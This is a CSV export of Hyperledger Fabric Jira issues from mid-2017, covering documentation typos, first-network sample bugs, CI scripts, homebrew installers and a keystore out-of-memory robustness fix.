container = json.loads(str(subprocess.check_output([""docker"", ""inspect"", containerID])))[0]
File ""/usr/lib/python2.7/subprocess.py"", line 573, in check_output
raise CalledProcessError(retcode, cmd, output=output)
subprocess.CalledProcessError: Command '['docker', 'inspect', 'Error']' returned non-zero exit status 1
{noformat}",fabric commit efbaee526b1ab08dd7e603f9f8a381af60bab48d,ChristopherFerris,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5xb:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,nemoto,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"02/Jul/17 2:02 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/#/c/11285/1;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Document that RSA keys are not supported,FAB-5029,18708,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,elli-androulaki,elli-androulaki,elli-androulaki,27/Jun/17 9:45 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,27/Jun/17 11:36 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,Documentation,MembershipServices,,,,,We need to document that in Fabric v1 there is no support for RSA keys in certificates.,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2gv:",,,,,,,,,,,,,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Incorrect syntax for network down in ""Building Your First Network"" sample",FAB-5030,18709,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,chris.elder,chris.elder,27/Jun/17 10:01 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jun/17 7:33 PM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"There are two errors referring to the network down:

./byfn.sh down

should be

./byfn.sh -m down

The first is in the Note block under ""What’s happening behind the scenes?""

The second is located in the first block under the ""Troubleshooting"" section.

 ",,chris.elder,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx2db:",,,,,,,,,,,,,,,,,,,,,,,chris.elder,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 1:03 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11225;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Syntax error in fabric samples e2e template,FAB-5031,18711,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,27/Jun/17 10:36 PM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jun/17 2:00 AM,v1.0.0-rc1,,,v1.0.0,,fabric-samples,,,,,,0,,,,,,,There is a rogue indented network section at the beginning of the e2e template file.,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5xr:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Jun/17 2:01 AM;jyellick;This was fixed in https://gerrit.hyperledger.org/r/#/c/11191/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"Typo in ""Writing Your First Application""",FAB-5033,18714,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,markparz,chris.elder,chris.elder,28/Jun/17 12:06 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,30/Jun/17 4:12 AM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,"In ""Writing Your First Application"", there is a typo in the following bullet point:
 * installs smart contract (i.e. chaincode) onto the peer’s file system and instantiates said chaincode on the channel; instantiate starts a {color:#d04437}chaincdoe {color}container

chaincode is misspelled.",,chris.elder,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5xz:",,,,,,,,,,,,,,,,,,,,,,,chris.elder,markparz,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 6:00 AM;markparz;https://gerrit.hyperledger.org/r/#/c/11235/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
better visibility of binaries and docker images d/l,FAB-5034,18716,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,28/Jun/17 12:38 AM,21/Jul/18 3:55 AM,28/Oct/23 3:00 AM,30/Jun/17 12:47 AM,v1.0.0-rc1,,,v1.0.0,,fabric-docs,,,,,,0,,,,,,,https://chat.hyperledger.org/channel/fabric-release?msg=YRAS8ZQY3cD9CfWrj,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy5y7:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Jun/17 1:12 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/#/c/11197/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
bccsp out-of-memory condition searching for key,FAB-5035,18717,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,vpaprots,rennman,rennman,28/Jun/17 12:51 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,12/Feb/18 8:05 PM,v1.0.0-rc1,,,v1.1.0,,fabric-crypto,,,,,,0,,,,,,,"The loop in searchKeystoreForSKI() in fabric/bccsp/sw/fileks.go reads all the files in the keystore Dir. Purely by coincidence, I had a large test file in my configured keystore Dir.

20G May 24 16:03 bigfile

Consequently, the ioutil.ReadFile routine eventually fell over with a failed malloc().

Obviously I can clean this up for the purposes of test execution but the question remains, how safe is this? Do we need to protect against/limit this kind of file-based manipulation?",,angelo.decaro,binhn,denyeart,elli-androulaki,rennman,skarim,vpaprots,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/17 12:50 AM;rennman;gotest.txt;https://jira.hyperledger.org/secure/attachment/11387/gotest.txt",,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5yf:",,,,,,,,,,,,,,,,,,,,,,,angelo.decaro,binhn,denyeart,elli-androulaki,rennman,skarim,vpaprots,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 10:16 PM;Clayton Sims;Anil can you take a look.;;;","30/Jun/17 2:57 AM;skarim;This requires manually copying over a very large file over into the keystore directory inside MSP. This is not a likely scenario, as the files stored in the keystore directory are handled by BCCSP. However, improvements can be made to do some size checking on the files before reading them in, this is can be handled in v1.1;;;","30/Jun/17 3:03 AM;skarim;This is also down in BCCSP, I am assigning this over to Vlad for his awareness. [~vpaprots];;;","30/Jun/17 10:46 PM;binhn;This should be moved to 1.1 as improvement, and I will change as such.
We should be able to determine whether a file contain the right info by various techniques before reading the whole file.;;;","06/Jul/17 1:39 AM;vpaprots;FYI: [~adc]

This is in the sw bccsp, the code that I added for keystore search, after some discussion with Binh on making keystore file names user-friendly when they are generated by the user (i.e. via openssp), rather then by bccsp directly..

Sounds like the smarter thing to do is to check the file size before opening all files in the keystore directory..;;;","06/Jul/17 10:15 AM;angelo.decaro;[~vpaprots], shall we parse files only with a certain extension?;;;","06/Jul/17 9:48 PM;vpaprots;I was thinking querying the size of the file before reading it in. It should only be big enough to pem-encode all keys.. say 16k-bits RSA on the extreme? That size should never cause an OOM!

https://stackoverflow.com/questions/17133590/how-to-get-file-length-in-go;;;","06/Jul/17 10:19 PM;binhn;[~angelo.decaro] if file ext .pem is standard, that could be 1 of the criteria, but I see our keystore doesn't follow that;  the file size as suggested by [~vpaprots] would be a good filter.  I also thought we could read the first non-blank line and make sure it begins with the right characters; ie ""-----BEGIN *-----"" ;;;","07/Jul/17 10:06 AM;angelo.decaro;[~binhn], [~vpaprots], Actually, we might have all these filter. Move to the standard .pem extension and have the filtering on the first line and the size as well. Makes sense to me.;;;","01/Sep/17 4:32 PM;elli-androulaki;[~vpaprots], [~vpaprots@ca.ibm.com], is this ""In progress""?;;;","27/Nov/17 12:32 PM;denyeart;[~vpaprots] Can you provide an update?;;;","06/Feb/18 11:27 PM;Clayton Sims;[~vpaprots]  any update here?;;;","08/Feb/18 5:32 AM;Clayton Sims;https://gerrit.hyperledger.org/r/c/17641/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,
update daily test suite CI script,FAB-5036,18724,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,28/Jun/17 2:52 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Jul/17 3:28 AM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"Update Daily Test suite CI script to run ""ledger"", ""Auction Chaincode"", ""behave"" and ""example02"" chaincode tests.

CI script has to update to run behave tests in virtualenv to execute tests on python2.7.12

 

 ",,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy43z:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Jul/17 3:29 AM;rameshthoomu;Patch has been submitted and merged.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
example02 chaincode tests are failing in daily builds,FAB-5037,18726,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,rameshthoomu,rameshthoomu,28/Jun/17 2:54 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Jul/17 12:51 AM,v1.0.0-rc1,,,v1.0.0,,fabric-build,,,,,,0,build-system,,,,,,"example02 chaincode tests are failing in daily builds 

Below is the build log:

https://jenkins.hyperledger.org/view/Daily/job/fabric-daily-chaincode-tests-x86_64/121/console",Jenkins x86_64,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5zr:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
first-network crypto-config dir is owned by root,FAB-5038,18727,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,mastersingh24,jyellick,jyellick,28/Jun/17 3:13 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,01/Jul/17 2:53 AM,v1.0.0-rc1,,,v1.0.0,,fabric-samples,,,,,,0,,,,,,,"Update:

I now have a procedure which reliably reproduces the original bug.

1. {{./byfn.sh -m generate}}
2. {{./byfn.sh -m up}}

Wait until completed successfully with the large ""END"" message.  Then escape via ^c.

3. {{./byfn.sh -m down}}
4. {{./byfn.sh -m up}}

Note, the crypto material was not regenerated here.  And the 'up' fails with the following error: ""ERRO 001 Cannot run peer because cannot init crypto, missing /opt/gopath/src/github.com/hyperledger/fabric/peer/crypto/peerOrganizations/org1.example.com/users/Admin@org1.example.com/msp folder""

5. {{./byfn.sh -m down}}

The error as documented below is observed.

===================================================

After running the byfn.sh example, attempting to invoke {{./byfn.sh -m down}} may result in error, because the user does not have permissions to remove the {{crypto-config-dir}}.

{noformat}
[yellickj@jmobile first-network]$ ./byfn.sh -m down
Stopping with channel 'mychannel' and CLI timeout of '10000'
Continue (y/n)? y
proceeding ...
WARNING: The CHANNEL_NAME variable is not set. Defaulting to a blank string.
WARNING: The TIMEOUT variable is not set. Defaulting to a blank string.
Removing peer0.org2.example.com ... done
Removing peer1.org1.example.com ... done
Removing orderer.example.com ... done
Removing peer1.org2.example.com ... done
Removing peer0.org1.example.com ... done
Removing network net_byfn
eb1d080e7655
82f6ddbda167
91790bc3cf5f
585b2505dd26
---- No images available for deletion ----
rm: cannot remove 'crypto-config/peerOrganizations/org2.example.com/peers/peer1.org2.example.com/msp/keystore': Permission denied
rm: cannot remove 'crypto-config/peerOrganizations/org2.example.com/peers/peer1.org2.example.com/tls': Permission denied
rm: cannot remove 'crypto-config/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/msp/keystore': Permission denied
rm: cannot remove 'crypto-config/peerOrganizations/org2.example.com/peers/peer0.org2.example.com/tls': Permission denied
rm: cannot remove 'crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/msp/keystore': Permission denied
rm: cannot remove 'crypto-config/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls': Permission denied
rm: cannot remove 'crypto-config/peerOrganizations/org1.example.com/peers/peer1.org1.example.com/msp/keystore': Permission denied
rm: cannot remove 'crypto-config/peerOrganizations/org1.example.com/peers/peer1.org1.example.com/tls': Permission denied
rm: cannot remove 'crypto-config/ordererOrganizations/example.com/orderers/orderer.example.com/msp': Permission denied
rm: cannot remove 'crypto-config/ordererOrganizations/example.com/orderers/orderer.example.com/tls': Permission denied
[yellickj@jmobile first-network]$ sudo ^C
[yellickj@jmobile first-network]$ ls -l
total 68
drwxr-xr-x 2 yellickj users  4096 Jun 27 10:40 base
drwxr-xr-x 2 yellickj users  4096 Jun 23 18:08 bin
-rwxr-xr-x 1 yellickj users 13409 Jun 27 10:40 byfn.sh
drwxr-xr-x 4 yellickj users  4096 Jun 27 10:40 chaincode
drwxr-xr-x 2 yellickj users  4096 Jun 27 14:10 channel-artifacts
-rw-r--r-- 1 yellickj users  5013 Jun 27 10:40 configtx.yaml
drwxr-xr-x 4 root     root   4096 Jun 27 14:09 crypto-config
-rw-r--r-- 1 yellickj users  3858 Jun 27 10:40 crypto-config.yaml
-rw-r--r-- 1 yellickj users  2855 Jun 27 10:40 docker-compose-cli.yaml
-rw-r--r-- 1 yellickj users  2132 Jun 27 10:40 docker-compose-couch.yaml
-rw-r--r-- 1 yellickj users  2724 Jun 27 10:40 docker-compose-e2e-template.yaml
-rw-r--r-- 1 yellickj users   217 Jun 27 10:40 README.md
drwxr-xr-x 2 yellickj users  4096 Jun 27 14:09 scripts
{noformat}

",,ChristopherFerris,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy5zz:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,jyellick,mastersingh24,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Jun/17 1:11 AM;ChristopherFerris;I'm not seeing this... just pulled latest and ran byfn.sh -m generate and here is the contents:

cbf$ ls -la

total 104

drwxr-xr-x  16 cbf  staff    544 Jun 28 12:10 .

drwxr-xr-x  13 cbf  staff    442 Jun 28 12:09 ..

-rw-r--r--   1 cbf  staff     25 Jun 28 12:06 .env

-rw-r--r--   1 cbf  staff    217 Jun 28 12:06 README.md

drwxr-xr-x   4 cbf  staff    136 Jun 28 12:06 base

-rwxr-xr-x   1 cbf  staff  13409 Jun 28 12:06 byfn.sh

drwxr-xr-x   4 cbf  staff    136 Jun 28 12:06 chaincode

drwxr-xr-x   7 cbf  staff    238 Jun 28 12:10 channel-artifacts

-rw-r--r--   1 cbf  staff   5013 Jun 28 12:06 configtx.yaml

drwxr-xr-x   4 cbf  staff    136 Jun 28 12:10 crypto-config

-rw-r--r--   1 cbf  staff   3858 Jun 28 12:06 crypto-config.yaml

-rw-r--r--   1 cbf  staff   2855 Jun 28 12:06 docker-compose-cli.yaml

-rw-r--r--   1 cbf  staff   2132 Jun 28 12:06 docker-compose-couch.yaml

-rw-r--r--   1 cbf  staff   2724 Jun 28 12:06 docker-compose-e2e-template.yaml

-rw-r--r--   1 cbf  staff   2932 Jun 28 12:10 docker-compose-e2e.yaml

drwxr-xr-x   3 cbf  staff    102 Jun 28 12:06 scripts;;;","29/Jun/17 1:33 AM;jyellick;I am no longer seeing this with the current fabric-samples.  Closing and will re-open if it recurs.;;;","30/Jun/17 4:14 AM;jyellick;Am now able to reliably reproduce.  Updated and re-opened.;;;","30/Jun/17 9:33 PM;mastersingh24;I was able to reproduce this on a Ubuntu system.  The issue is that the Docker daemon will automatically create host paths for volumes if they don't exist.  Typically on Linux systems, the Docker daemon runs as root so when the daemon does not find *crypto-config/...* it creates it and of course it's owned by root.  You won't see this with Docker for Mac / Windows because the Docker daemon is running under the logged in user.  Docker Toolbox might have this issue.

My proposed fix is to simply check if *crypto-config* exists and if not call the *generate* actions since the comment for networkUp states it will generate the artifacts if necessary;;;","30/Jun/17 9:40 PM;jyellick;+1 to this approach, I had naively assumed that calling generate once was sufficient, and had not realized the {{down}} wiped out the crypto as well.;;;","30/Jun/17 9:51 PM;mastersingh24;https://gerrit.hyperledger.org/r/11307;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Update basic-network to v1.0.0,FAB-5040,18730,18773,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jimthematrix,ChristopherFerris,ChristopherFerris,28/Jun/17 6:15 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,14/Jul/17 10:47 PM,v1.0.0,,,v1.0.0,,fabric-samples,,,,,,0,,,,,,,basic-network sample did not work with rc1 images because of changes to fabric in https://jira.hyperledger.org/browse/FAB-2783,,ChristopherFerris,JonathanLevi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Not a security issue,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy60f:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,JonathanLevi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/17 6:19 AM;ChristopherFerris;https://gerrit.hyperledger.org/r/11205;;;","12/Jul/17 3:19 AM;JonathanLevi;[~ChristopherFerris], I have asked [~jimthematrix] to lend a hand here, so that we bring it forward to Fabric 1.0.0. Thanks.

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
add consortium and organization to glossary,FAB-5041,18731,27586,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,pandrejko,Clayton Sims,Clayton Sims,28/Jun/17 6:40 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,07/Apr/18 6:58 AM,v1.0.0-rc1,,,v1.2.0,,fabric-docs,,,,,,0,Documentation,,,,,,Add consortium and organization to glossary,,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzx26n:",,,,,,,,,,,,,,,,,,,,,,,joe-alewine,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"23/Mar/18 4:41 AM;pandrejko;https://gerrit.hyperledger.org/r/#/c/19617/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Enable platform-specific installers,FAB-5042,18732,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,ChristopherFerris,ChristopherFerris,28/Jun/17 8:38 AM,21/Jul/18 3:57 AM,28/Oct/23 3:00 AM,30/Mar/18 9:58 AM,v1.0.0,,,,,fabric-installers,,,,,,0,,,,,,,"I'd like to provide platform specific installers for Fabric tools/binaries in time for 1.0.

MacOSX == homebrew

Windows == choclatey or innosetup

linux == apt",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4267,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzy60n:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"06/Dec/17 7:56 PM;ChristopherFerris;I've done the Homebrew installer, but lack a Windows or Linux environment to play with.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
implement homebrew tap for fabric,FAB-5043,18733,18732,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,28/Jun/17 8:39 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,29/Jun/17 4:16 AM,v1.0.0,,,v1.0.0,,fabric-installers,,,,,,6,,,,,,,"implement homebrew tap and installer

create GH mirrored Gerrit repository named:

hyperledger/homebrew-fabric

same review policy as fabric (2+2 same maintainer list)",,binhn,ChristopherFerris,dhuseby,greg.haskins,jyellick,qiang0723,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy60v:",,,,,,,,,,,,,,,,,,,,,,,binhn,ChristopherFerris,dhuseby,greg.haskins,jyellick,qiang0723,ryjones,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"28/Jun/17 8:44 AM;ChristopherFerris;I'd like to get other maintainers to agree to create a new repository for homebrew formulae for fabric as described above.;;;","28/Jun/17 9:04 AM;greg.haskins;I don't know enough about homebrew packaging to vote yes/no on the proposed implementation.  I am just voting ""yes"" on the general notion that offering homebrew packages is a good idea.  I'll leave it to those with experience to tease out the ""how"".;;;","28/Jun/17 9:15 AM;ryjones;is homebrew-fabric a requirement, or would fabric-homebrew work? The latter would fit into the existing naming scheme. I don't feel strongly about this.;;;","28/Jun/17 10:31 PM;binhn;I would prefer fabric-homebrew, but if we (HL) homebrew others as well, then homebrew-* makes sense.

I also don't know the mechanics of homebrew, but I am voting for this effort.;;;","29/Jun/17 12:44 AM;ChristopherFerris;unfortunately the way Homebrew works, the repo name MUST be <org>/homebrew-<tapname>.
 
[https://github.com/Homebrew/brew/blob/master/docs/brew-tap.md#repository-naming-conventions-and-assumptions];;;","29/Jun/17 12:58 AM;jyellick;I am likewise largely ignorant of how homebrew works, so cannot comment on the approach, but support making fabric easier to approach for users is always a good thing.;;;","29/Jun/17 1:12 AM;ChristopherFerris;ok, we have 5 maintainers in support, I'll ask Ry to make it so. Thanks;;;","29/Jun/17 2:54 AM;dhuseby;Homebrew taps are Mac centric and completely useless on Linux or Windows.  I'm not against it, just wanted to point out that it doesn't have general application.;;;","29/Jun/17 4:17 AM;ryjones;project is [here|https://gerrit.hyperledger.org/r/#/admin/projects/homebrew-fabric]

mirror is [here|https://github.com/hyperledger/homebrew-fabric]

2+2 rules in place;;;","30/Jun/17 4:07 AM;ChristopherFerris;[~dhuseby] yes, I am fully aware of that... we'll be working on Windows and Linux as well... they all need different installers sadly.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,
implement homebrew formula for fabric tools,FAB-5044,18734,18732,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,ChristopherFerris,ChristopherFerris,ChristopherFerris,28/Jun/17 8:42 AM,20/Jul/18 11:13 PM,28/Oct/23 3:00 AM,06/Dec/17 7:55 PM,v1.0.0,,,,,fabric-installers,,,,,,0,,,,,,,"implement homebrew formula for:

configtxgen

cryptogen

configtxlator

peer

orderer",,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzy613:",,,,,,,,,,,,,,,,,,,,,,,ChristopherFerris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
